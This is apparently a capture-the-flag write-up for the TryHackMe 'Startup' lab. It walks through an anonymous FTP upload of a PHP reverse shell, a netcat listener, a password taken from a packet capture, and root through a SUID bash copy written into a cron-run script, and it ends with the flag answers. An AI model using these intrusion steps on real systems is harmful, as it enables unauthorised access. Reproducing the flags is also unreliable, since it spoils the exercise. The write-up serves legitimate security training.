# Task 1 Welcome to Spice Hut!
----

>>We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

## SCANNING 

```bash
root@ip-10-10-116-6:~# nmap -sC -sV 10.10.157.159

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-07 13:45 GMT
Nmap scan report for ip-10-10-157-159.eu-west-1.compute.internal (10.10.157.159)
Host is up (0.0019s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.116.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:97:A7:67:7A:37 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds

root@ip-10-10-116-6:~# gobuster dir -u http://10.10.157.159 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.157.159
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/07 13:47:52 Starting gobuster
===============================================================
/files (Status: 301)
/server-status (Status: 403)
===============================================================
```

## MAKING FTP CONNECTION AS ANONYMOUS 

```bash
root@ip-10-10-116-6:~# ftp 10.10.157.159
Connected to 10.10.157.159.
220 (vsFTPd 3.0.3)
Name (10.10.157.159:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (141.5820 MB/s)
```

>>After uploading the reverse shell through ftp go to url below and click it down before that create a netcat session.
>>URL:http://10.10.157.159/files/ftp

```
Index of /files/ftp
[ICO]   Name    Last modified   Size    Description
[PARENTDIR] Parent Directory        -    
[ ] php-reverse-shell.php   2022-01-07 13:56    5.4K     
```
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/home$ ^Z
[1]+  Stopped                 nc -lvnp 7007
root@ip-10-10-116-6:~# stty raw -echo
root@ip-10-10-116-6:~# nc -lvnp 7007

www-data@startup:/home$ export TERM=xterm
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

>>There is a pcappng file in the incidents file in the '/' directory go ahead and copy it to '/var/www/html/ftp' and go to url's ftp and open it with wireshark.
>>In that .pcappng file the point is in the 57 position were can find the password for www-data.  
```
57  11.543220716    192.168.22.139  192.168.22.139  TCP 249 40934 ? 4444 [PSH, ACK] Seq=418 Ack=4 Win=65536 Len=181 TSval=720586187 TSecr=720586181
```
```bash
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc     initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old
boot  home    lib         mnt    root        srv   vagrant
data  incidents   lib64       opt    run         sys   var
dev   initrd.img  lost+found      proc   sbin        tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ exit
exit
exit
$ exit
```

>>Logging in as lennie with the password we found then cat out th user.txt

```bash
www-data@startup:/home$ su lennie
Password: 
lennie@startup:/home$
lennie@startup:/home$ cd lennie/
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

>>There is a script directory which as planner.sh that is the point to escalate our privilege as root.
>>This is the payload to do that 
"echo "cp /bin/bash /tmp && chmod +s /tmp/bash" > /etc/print.sh"
>>This will copy bash to the tmp directory and modify the permission then redirect to the print.sh file in the etc directory.

```bash
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ echo "cp /bin/bash /tmp && chmod +s /tmp/bash" > /etc/print.sh
lennie@startup:~/scripts$ cd /tmp
lennie@startup:/tmp$ ls
bash
lennie@startup:/tmp$ bash -p
lennie@startup:/tmp$ ls
bash
lennie@startup:/tmp$ ls -la
total 1044
drwxrwxrwt  7 root root    4096 Jan  7 14:39 .
drwxr-xr-x 25 root root    4096 Jan  7 13:44 ..
-rwsr-sr-x  1 root root 1037528 Jan  7 14:39 bash
drwxrwxrwt  2 root root    4096 Jan  7 13:43 .font-unix
drwxrwxrwt  2 root root    4096 Jan  7 13:43 .ICE-unix
drwxrwxrwt  2 root root    4096 Jan  7 13:43 .Test-unix
drwxrwxrwt  2 root root    4096 Jan  7 13:43 .X11-unix
drwxrwxrwt  2 root root    4096 Jan  7 13:43 .XIM-unix
lennie@startup:/tmp$ cd ~/scripts
lennie@startup:~/scripts$ /tmp/bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```
----

# Task 2 Credits
----

>>Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!                                                             
>>Find my official writeup here: https://www.youtube.com/watch?v=3qNxI1OggGc

>>I'd like to thank ku5e for being a good sensei and GeneralClaw, my grammar cop.

>>I'd like to thank my testers  Amit25095, BarZigmon and powershot.

>>Additionally, I'd love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community.

>>And of course, I'd like to thank you for playing. Hope to see you soon!

----

# ANSWER THE FOLLOWING :
----

1.What is the secret spicy soup recipe?
>>love

2.What are the contents of user.txt?
>>THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

3.What are the contents of root.txt?
>>THM{f963aaa6a430f210222158ae15c3d76d}

4.Congratulations!
>>No answer needed

----